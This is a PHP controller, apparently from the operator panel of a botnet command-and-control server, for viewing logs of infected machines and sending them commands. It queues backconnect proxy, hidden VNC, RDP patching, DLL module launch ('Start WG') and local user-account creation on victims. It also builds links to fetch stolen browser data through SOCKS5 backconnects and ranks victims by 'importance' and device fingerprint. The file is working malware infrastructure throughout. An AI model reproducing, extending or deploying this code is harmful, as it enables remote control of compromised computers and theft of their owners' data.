<?php defined('SYSPATH') or die('No direct script access.');

class Controller_Log extends Controller_Template{
    public $template = 'v_main';

    public function before(){
        $auth = Auth::instance();

        if($auth->logged_in() && Helper::checkActionInRole('Logs')){
            return parent::before();
        }else{
            HTTP::redirect('/login/index');
        }
    }

    private static function addCommand($array, $client_id, $redirect = true){
        DB::insert('commands', array_keys($array))->values($array)->execute();

        if($redirect){
            HTTP::redirect('/log/'.$client_id);
        }
    }

    private function GetBrowDataLast($client_id, $lastBackconndata = null){
        $client = ORM::factory('Client', $client_id);
        $link = null;

        if ( $lastBackconndata )
        {
            $socks = 'socks5://' . $lastBackconndata->ip . ':' . $lastBackconndata->port . '_';
        }
        else
        {
            $socks = '';
        }

        $proc = DB::select()
            ->from('remoteproc')
            ->where('proc', '=', 'GetBrowDataLast')
            ->limit(1)
            ->execute()
            ->as_array();

        if(!empty($proc)){
            $remote_user = DB::select()->from('remoteusers')->where('name', '=', $proc[0]['name'])->execute()->as_array();
            if(!empty($remote_user)){
                $where = Kohana::$config->load('init.get_brow_data_last');
                $link = 'mailto: '.$socks.'https://'.$where.'/'.$remote_user[0]['name'].'/'.$remote_user[0]['password'].'/99/GetBrowDataLast/'.$client->getClientID().'/';
            }
        }


        $link = '<a href="'.$link.'">GetBrowDataLast</a>';
        return $link;
    }

	public function action_index(){
        if(isset($_POST['hideEmptyFields']) && !Session::instance()->get('hideEmptyFields')){
            Session::instance()->set('hideEmptyFields', true);
        }elseif(isset($_POST['hideEmptyFields']) && Session::instance()->get('hideEmptyFields')){
            Session::instance()->set('hideEmptyFields', false);
        }

        $client_id = $this->request->param('id');
        if ( null === $client_id )
        {
            throw HTTP_Exception::factory(404);
        }

        $client = ORM::factory('Client', ['id' => $client_id]);
        if ( ! $client->loaded() )
        {
            throw HTTP_Exception::factory(404);
        }
        $alpha_country = Kohana::$config->load('country')->as_array();
        $client->country = isset($alpha_country[$client->country]) ? $alpha_country[$client->country] : $client->country;
        
        if ( $client->importance >= Model_Client::MIN_HIGH_IMPORTANCE && ! Auth::instance()->get_user()->hasAction('View client with high importance') )
        {
            throw HTTP_Exception::factory(403, 'Access denied for client with high importance');
        }

        $client_net = ORM::factory('Client', ['id' => $client_id])->group;
        $file_path_net_access = Kohana::find_file('net_access', Auth::instance()->get_user()->id, 'json');
        if($file_path_net_access){
            $net_list = json_decode(
                file_get_contents($file_path_net_access), true
            );
            if(empty(preg_grep('#'.preg_replace('#\d+.*#', '*', trim($client_net)).'#', $net_list)) && !in_array($client_net, $net_list)){
                HTTP::redirect('/');
            }
        }
        
        if (0 != $client->devhash_4 || 0 != $client->devhash_3 || 0 != $client->devhash_2 || 0 != $client->devhash_1) {
            $countSameDevhash = ORM::factory('Client')
                ->where('devhash_4', '=', $client->devhash_4)
                ->where('devhash_3', '=', $client->devhash_3)
                ->where('devhash_2', '=', $client->devhash_2)
                ->where('devhash_1', '=', $client->devhash_1)
                ->count_all() - 1;
        }

        // Due to bug in postgresql we can't use ORM to get client logs
        $queryClientLogs = DB::select()
            ->from($client->logs->table_name())
            ->where('client_id', '=', $client->id);
        $queryCountClientLogs = clone $queryClientLogs;
        $countClientLogs = $queryCountClientLogs->select([DB::expr('COUNT(*)'), 'count'])
            ->execute()
            ->get('count');
        $queryClientLogs->select('created_at', 'info', 'type', 'command')
            ->order_by('created_at', 'DESC');
        $pagination = Pagination::factory(['total_items' => $countClientLogs]);
        $pagination->items_per_page = 10;
        $log = DB::select()
            ->from([$queryClientLogs, 'log'])
            ->order_by('created_at', 'DESC')
            ->limit($pagination->items_per_page)
            ->offset($pagination->offset)
            ->execute()
            ->as_array();

        $const_tmp = [
            1 => 'OK',
            2 => 'Invalid input params',
            3 => 'Signature verification failed',
            4 => 'Download failed',
            5 => 'Downloaded file is corrupted',
            6 => 'Any Win32 error',
            7 => 'Start failed',
        ];

        foreach ($log as $k => $l){
            if(preg_match('#^\d+\s\d+$#', $l['info']) && intval($l['command']) == 10){
                $tmp = explode(' ', $l['info']);
                if(isset($const_tmp[intval(end($tmp))])){
                    $log[$k]['command'] .= ' '.$const_tmp[intval(end($tmp))];
                }
            }
        }

//        $importanceevents = DB::select([DB::expr('NULL'), 'datetime'])
//            ->select('client_importanceevent.id')
//            ->select('client_importanceevent.eventid')
//            ->select('event.name')
//            ->select('event.params')
//            ->select('client_importanceevent.count')
//            ->select('event.add')
//            ->select('event.mul')
//            ->select('event.const')
//            ->select('event.enabled')
//            ->from([ORM::factory('Client_ImportanceEvent')->table_name(), 'client_importanceevent'])
//            ->join([ORM::factory('ImportanceEvent')->table_name(), 'event'])->on('client_importanceevent.eventid', '=', 'event.id')
//            ->where('client_importanceevent.signaled', '=', true)
//            ->where('client_importanceevent.clientid', '=', $client->id)
//            ->execute()
//            ->as_array();
//
//        $importanceeventsLogs = $client
//            ->logs
//            ->where('comment', 'LIKE', 'ImportanceEvent%')
//            ->order_by('datetime', 'DESC')
//            ->find_all();
//
//        foreach($importanceevents as &$importanceevent) {
//            $importanceevent['enabled'] = 't' == $importanceevent['enabled'];
//            foreach($importanceeventsLogs as $importanceeventsLog) {
//                if ( ! preg_match('/^ImportanceEvent\s(?<eventid>\d+)\ssignaled$/', $importanceeventsLog->comment, $matches)) {
//                    Kohana::$log->add(Log::NOTICE, 'Unknown comment encountered while matching logs to importance events (comment: :comment)', [
//                        ':comment' => $importanceeventsLog->comment,
//                    ]);
//                    continue;
//                }
//
//                if ($matches['eventid'] == $importanceevent['eventid']) {
//                    $importanceevent['datetime'] = $importanceeventsLog->datetime;
//                    break;
//                }
//            } unset($importanceeventsLog);
//        } unset($importanceevent);
//        usort($importanceevents, function($importanceeventA, $importanceeventB) {
//            if (null === $importanceeventB['datetime'] && null === $importanceeventA['datetime']) {
//                return $importanceeventB['id'] - $importanceeventA['id'];
//            }
//            return strcmp($importanceeventB['datetime'], $importanceeventA['datetime']);
//        });

//        $databrowser = DB::select()
//            ->from('databrowser')
//            ->where('clientid', '=', $client_id)
//            ->order_by('datetime', 'DESC')
//            ->as_object()
//            ->execute();
        
//        $backconndata = DB::select()
//            ->from('backconndata')
//            ->where('clientid', '=', $client_id)
//            ->order_by('datetime', 'desc')
//            ->limit(10)
//            ->as_object()
//            ->execute();
        
//        $pagination_bc = Helper::pagination($backconndata);
//        $pagination_bc->items_per_page = 10;
//        $backconndata->limit(10)

//        $dataaccount = $client
//            ->dataaccounts
//            ->order_by('id', 'DESC')
//            ->find();
//        if ( $dataaccount->loaded() )
//        {
//            $dataaccount->data = pg_unescape_bytea($dataaccount->data);
//        }
//        else
//        {
//            unset($dataaccount);
//        }
        
//        $link = $this->GetBrowDataLast($client_id, Arr::get($backconndata, 0));

        $actions = ORM::factory('Action')->find_all();

        if(isset($_POST['vars'])){
            $vars = ORM::factory('Var')
                ->getClientVars($client_id, true);
        }else{
            $vars = ORM::factory('Var')
                ->getClientVars($client_id, false);
        }

        $commands = ORM::factory('Command')
            ->where('client_id', '=', $client_id)
            ->and_where('result_code', 'IS', NULL)
            ->find_all();

        $servers = ORM::factory('Server')->find_all();
//        $columns = ORM::factory('Server')
//            ->list_columns();

        $isAllowedToWorkWithCommands = Helper::checkActionInRole('Commands') && ( $client->importance < Model_Client::MIN_HIGH_IMPORTANCE || Auth::instance()->get_user()->hasAction('Edit client with high importance') );
        
        if ($isAllowedToWorkWithCommands)
        {
            /* DELETE COMMANDS */
            if( isset($_POST['delete-command']) && isset($_POST['id-delete-commands']) ){
                foreach($_POST['id-delete-commands'] as $i){
                    DB::delete('commands')->where('id', '=', $i)->execute();
                }
                HTTP::redirect('/log/'.$client_id);
            }

            /* ADD COMMAND (PUSH BACK) */
            if( isset($_POST['create']) ){
                $data = Arr::extract($_POST, ['incode', 'params']);
                $data['client_id'] = $client_id;
                ORM::factory('Userslogs')
                    ->createLog2(
                        "&laquo;Push Back&raquo; in client <a href='/log/".$client_id."'>".$client_id."</a>",
                        $data
                    );
                self::addCommand($data, $client_id);
            }
            /* BC */
            if( isset($_POST['BC']) ){
                ORM::factory('Userslogs')->createLog("push &laquo;BC&raquo; in client <a href='/log/".$client_id."'>".$client_id."</a>");
                self::addCommand([
                    'client_id' => $client->id,
                    'incode' => 58,
                    'params' => "bccfg",
//                    'created_at' => DB::expr("NOW()"),
                ], $client_id);
            }
            /* VNC */
            if( isset($_POST['VNC']) ){
                ORM::factory('Userslogs')->createLog("push &laquo;VNC&raquo; in client <a href='/log/".$client_id."'>".$client_id."</a>");
                self::addCommand([
                    'client_id' => $client->id,
                    'incode' => 58,
                    'params' => "bccfg",
                ], $client_id, false);

                self::addCommand([
                    'client_id' => $client->id,
                    'incode' => 57,
                    'params' => "0000",
                ], $client_id);
            }
            /* RDP patch */
            if( isset($_POST['RDP-patch']) )
            {
                ORM::factory('Userslogs')->createLog("push &laquo;RDP patch&raquo; in client <a href='/log/".$client_id."'>".$client_id."</a>");
                self::addCommand([
                    'client_id' => $client->id,
                    'incode' => 55,
                    'params' => "00000",
                ], $client_id);
            }
            /* Start WG */
            if( isset($_POST['Start-WG']) )
            {
                ORM::factory('Userslogs')->createLog("push &laquo;Start WG&raquo; in client <a href='/log/".$client_id."'>".$client_id."</a>");
                self::addCommand([
                    'client_id' => $client->id,
                    'incode' => 62,
                    'params' => "importDll start",
                ], $client_id, false);
                self::addCommand([
                    'client_id' => $client->id,
                    'incode' => 62,
                    'params' => "importDll control getdata",
                ], $client_id);
            }
            /* Create user */
            if (isset($_POST['CreateUser'])) {
                $userName = 'user' . rand(100, 999);
                ORM::factory('Userslogs')->createLog("push &laquo;Create user&raquo; user name &quot;" . $userName . "&quot; in client <a href='/log/".$client_id."'>".$client_id."</a>");
                self::addCommand([
                    'client_id' => $client->id,
                    'incode' => 32,
                    'params' => $userName,
                ], $client_id, false);
                $comment = $client->comment->value;
                if ( ! empty($comment)) {
                    $comment .= "\n";
                }
                $comment .= "pushed 32, user name " . $userName;
                Model_Client_Comment::upsertComment($client, $comment);
                HTTP::redirect('/log/'.$client_id);
            }
            /* Create user (adv) */
            if (isset($_POST['CreateUserAdv'])) {
                $userName = 'user' . rand(100, 999);
                ORM::factory('Userslogs')->createLog("push &laquo;Create user (adv)&raquo; user name &quot;" . $userName . "&quot; in client <a href='/log/".$client_id."'>".$client_id."</a>");
                self::addCommand([
                    'client_id' => $client->id,
                    'incode' => 31,
                    'params' => $userName,
                ], $client_id, false);
                $comment = $client->comment->value;
                if ( ! empty($comment)) {
                    $comment .= "\n";
                }
                $comment .= "pushed 31, user name " . $userName;
                Model_Client_Comment::upsertComment($client, $comment);
                HTTP::redirect('/log/'.$client_id);
            }
        }
        /* Comment */
        if ( Request::POST == $this->request->method() && null !== $this->request->post('update-comment') )
        {
            $comment = $this->request->post('comment');
            Model_Client_Comment::upsertComment($client, $comment);
        }
        $user = Auth::instance()->get_user();

        $this->template->content = BladeView::factory("log/index")
            ->bind('log', $log)
            ->bind('pagination', $pagination)
            ->bind('dataaccount', $dataaccount)
            ->bind('vars', $vars)
            ->bind('databrowser', $databrowser)
            ->bind('backconndata', $backconndata)
            ->bind('commands', $commands)
            ->bind('isAllowedToWorkWithCommands', $isAllowedToWorkWithCommands)
            ->bind('client', $client)
            ->bind('countSameDevhash', $countSameDevhash)
            ->bind('comment', $client->comment)
            ->bind('link', $link)
            ->bind('servers', $servers)
            ->bind('columns', $columns);
        $this->template->navbar = View::factory('v_navbar')
            ->bind('user', $user)
            ->bind('actions', $actions);
    }
}